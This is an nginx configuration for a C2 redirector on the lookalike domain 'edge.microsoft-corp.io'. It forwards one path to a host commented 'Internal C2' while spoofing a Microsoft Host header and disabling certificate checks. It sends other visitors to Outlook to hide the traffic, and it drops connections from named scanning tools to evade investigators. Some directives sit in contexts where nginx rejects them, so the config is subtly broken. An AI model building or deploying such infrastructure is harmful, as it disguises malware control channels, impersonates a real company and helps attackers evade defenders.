server {
    listen 443 ssl http2;
    server_name edge.microsoft-corp.io;

    ssl_certificate     /etc/ssl/certs/genesis.crt;
    ssl_certificate_key /etc/ssl/private/genesis.key;

    ssl_protocols       TLSv1.2 TLSv1.3;
    ssl_prefer_server_ciphers on;
    ssl_ciphers         "ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256";
    ssl_session_timeout 10m;
    ssl_session_cache   shared:SSL:10m;

    access_log  /var/log/nginx/redirect_access.log;
    error_log   /var/log/nginx/redirect_error.log warn;

    # Anti-scan and fingerprinting mitigation
    if ($http_user_agent ~* "(nmap|curl|masscan|dirbuster|zmap|sqlmap|nikto|w3af)") {
        return 444;
    }

    if ($request_method !~ ^(GET|POST|HEAD)$ ) {
        return 444;
    }

    if ($http_host !~* "edge.microsoft-corp.io") {
        return 444;
    }

    location /cdn-edge/ {
        proxy_pass              https://10.10.10.42:443;  # Internal C2
        proxy_http_version      1.1;
        proxy_set_header        Host "cdn.microsoft-services.com";
        proxy_set_header        X-Real-IP $remote_addr;
        proxy_set_header        X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header        X-Forwarded-Proto $scheme;
        proxy_ssl_verify        off;
        proxy_ssl_session_reuse on;
        proxy_read_timeout      60s;
        proxy_connect_timeout   15s;
        proxy_buffering         off;
    }

    # Fallback to real CDN to confuse traffic
    location / {
        proxy_pass https://outlook.office365.com;
        proxy_set_header Host outlook.office365.com;
    }

    # Geo-block certain regions (optional)
    geo $block_country {
        default 0;
        RU 1;
        CN 1;
        IR 1;
    }

    if ($block_country) {
        return 403;
    }

    # Rate-limiting (basic anti-brute-force)
    limit_req_zone $binary_remote_addr zone=req_limit_zone:10m rate=30r/m;
    limit_req zone=req_limit_zone burst=10 nodelay;
}
